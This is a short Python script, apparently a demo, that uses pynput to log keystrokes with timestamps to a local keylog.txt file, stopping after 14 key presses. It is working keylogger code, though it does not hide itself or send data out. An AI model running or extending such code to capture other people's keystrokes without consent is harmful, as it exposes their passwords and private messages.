from pynput.keyboard import Key, Listener
import logging
 
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
counter = 0
 
def on_press(key):
    global counter
    counter += 1
    if counter >= 14:
        print("14 characters reached. Stopping.")  
        return False
    
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()
